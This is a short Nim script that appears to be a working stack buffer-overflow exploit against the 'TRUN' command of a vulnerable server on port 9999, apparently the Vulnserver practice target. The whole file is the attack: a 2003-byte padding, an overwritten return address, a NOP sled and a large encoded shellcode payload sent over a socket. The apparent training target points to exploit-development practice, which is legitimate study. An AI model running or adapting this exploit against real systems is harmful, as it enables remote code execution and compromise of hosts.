import net
import strutils

let host = "192.168.83.49"
let port = Port(9999)
let offset = 2003
let buffer = repeat("\x41",2003) & "\xaf\x11\x50\x62" & repeat("\x90",25) & "\xb8\x3d\x99\xf7\x4e\xdb\xdb\xd9\x74\x24\xf4\x5b\x2b\xc9"&
"\xb1\x59\x31\x43\x14\x83\xc3\x04\x03\x43\x10\xdf\x6c\x0b"&
"\xa6\x90\x8f\xf4\x37\xce\x06\x11\x06\xdc\x7d\x51\x3b\xd0"&
"\xf6\x37\xb0\x9b\x5b\xac\xf9\x64\x54\x7b\xb3\xbc\xe0\xf1"&
"\x6c\xf1\x36\x59\x50\x90\xca\xa0\x85\x72\xf2\x6a\xd8\x73"&
"\x33\x3d\x96\x9c\xe9\xe9\xd3\x30\x1e\x9d\xa6\x88\x1f\x71"&
"\xad\xb0\x67\xf4\x72\x44\xd4\xf7\xa2\x2f\xac\xef\xc9\x77"&
"\x0d\x40\xcf\x54\xc8\xa9\xbb\x66\xe2\xd6\x0d\x1d\x30\xa2"&
"\x8f\xf7\x08\x74\x23\x36\xa5\x79\x3d\x7f\x02\x62\x48\x8b"&
"\x70\x1f\x4b\x48\x0a\xfb\xde\x4e\xac\x88\x79\xaa\x4c\x5c"&
"\x1f\x39\x42\x29\x6b\x65\x47\xac\xb8\x1e\x73\x25\x3f\xf0"&
"\xf5\x7d\x64\xd4\x5e\x25\x05\x4d\x3b\x88\x3a\x8d\xe3\x75"&
"\x9f\xc6\x06\x63\x9f\x27\xd9\x8c\xfd\xbf\x15\x41\xfe\x3f"&
"\x32\xd2\x8d\x0d\x9d\x48\x1a\x3d\x56\x57\xdd\x34\x70\x68"&
"\x31\xfe\x11\x96\xb2\xfe\x38\x5d\xe6\xae\x52\x74\x87\x25"&
"\xa3\x79\x52\xd3\xa9\xed\x9d\x8b\xfd\x10\x75\xc9\x01\xfa"&
"\xda\x44\xe7\xac\xb2\x06\xb8\x0c\x63\xe6\x68\xe5\x69\xe9"&
"\x57\x15\x92\x20\xf0\xbc\x7d\x9c\xa8\x28\xe7\x85\x23\xc8"&
"\xe8\x10\x4e\xca\x63\x90\xae\x85\x83\xd1\xbc\xf2\xf3\x19"&
"\x3d\x03\x96\x19\x57\x07\x30\x4e\xcf\x05\x65\xb8\x50\xf5"&
"\x40\xbb\x97\x09\x15\x8d\xec\x3c\x83\xb1\x9a\x40\x43\x31"&
"\x5b\x17\x09\x31\x33\xcf\x69\x62\x26\x10\xa4\x17\xfb\x85"&
"\x47\x41\xaf\x0e\x20\x6f\x96\x79\xef\x90\xfd\xf9\xe8\x6e"&
"\x83\xd5\x50\x06\x7b\x66\x61\xd6\x11\x66\x31\xbe\xee\x49"&
"\xbe\x0e\x0e\x40\x97\x06\x85\x05\x55\xb7\x9a\x0f\x3b\x69"&
"\x9a\xbc\xe0\x9a\xe1\xcd\x17\x5b\x16\xc4\x73\x5c\x16\xe8"&
"\x85\x61\xc0\xd1\xf3\xa4\xd0\x65\x0b\x93\x75\xcf\x86\xdb"&
"\x2a\x0f\x83";


var sock = newSocket()

try:
  sock.connect(host, Port(port))

  echo sock.recvLine()

  echo "Sending Exploit"

  sock.send("TRUN /.:/" & buffer)

  echo sock.recvLine()

finally:
  sock.close()


